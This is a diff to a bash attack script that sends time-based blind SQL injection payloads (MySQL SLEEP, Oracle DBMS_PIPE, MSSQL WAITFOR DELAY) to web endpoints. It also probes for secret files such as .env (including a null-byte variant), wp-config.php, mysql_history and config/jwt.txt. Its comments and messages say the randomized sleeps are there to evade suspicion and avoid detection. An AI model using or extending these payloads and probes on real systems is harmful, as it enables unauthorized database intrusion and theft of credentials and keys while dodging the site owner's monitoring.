@@ -73,17 +73,37 @@ Chicken ".idea/workspace.xml"
 echo -e "\e[0;33m[\e[0m?\e[0;33m]\e[0m Sleeping for 5 seconds to evade suspicion"
 sleep 5
 
+#Time
 time_audit_engine "/index.php?id=1'And(Select*From(Select("
-sleep $((2 + RANDOM % 3))
+sleep $((5 + RANDOM % 4)) # Kasih napas 5-8 detik biar server rileks
 
 time_audit_engine "/api/users?search=test'And(Select*From(Select("
-sleep $((2 + RANDOM % 3))
+sleep $((5 + RANDOM % 4))
 
+time_audit_engine "/view.php?type=1'+AND+7110=DBMS_PIPE.RECEIVE_MESSAGE(CHR(101),2)--"
+sleep $((6 + RANDOM % 3))
+
+time_audit_engine "/api/v1/products?search=test\";WAITFOR DELAY '0:0:2'--"
+sleep $((6 + RANDOM % 3))
+
+time_audit_engine "/api/items?cat=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(2)))x)"
+sleep $((5 + RANDOM % 4))
+
+#gentleman
 gentle_probe_engine ".env"
-sleep $((1 + RANDOM % 3))
+sleep $((4 + RANDOM % 3))
 
 gentle_probe_engine "wp-config.php"
-sleep $((1 + RANDOM % 3))
+sleep $((3 + RANDOM % 3))
+
+gentle_probe_engine ".env%00"
+sleep $((8 + RANDOM % 3))
+
+gentle_probe_engine "mysql_history"
+sleep $((3 + RANDOM % 3))
+
+gentle_probe_engine "config/jwt.txt"
+sleep $((4 + RANDOM % 3))
 
 echo -e "\e[0;33m[\e[0m?\e[0;33m]\e[0m Take your sleep man, for only 5 seconds."
 sleep 5
